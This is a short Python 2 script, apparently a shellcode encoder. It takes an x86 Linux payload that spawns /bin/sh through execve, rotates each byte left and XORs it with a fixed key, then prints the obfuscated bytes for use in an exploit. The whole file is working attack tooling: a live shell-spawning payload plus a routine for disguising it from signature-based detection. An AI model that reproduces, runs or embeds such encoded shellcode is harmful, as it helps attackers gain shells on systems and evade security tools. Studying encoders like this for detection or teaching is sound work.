#!/usr/bin/python

sc = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

max_bits = 8

key_byte = 0x32

final = ""

rotate_left = lambda byte, value, max_bits: \
    (byte << value%max_bits) & (2**max_bits-1) | \
    ((byte & (2**max_bits-1)) >> (max_bits-(value%max_bits)))

for byte in bytearray(sc) :

	rotl_byte = rotate_left(byte, 4, max_bits)
	xor_byte = rotl_byte ^ key_byte

	final += '0x'
	final += '%02x,' % (xor_byte & 0xff)

print (final)
print 'Len: %d' % len(bytearray(sc))
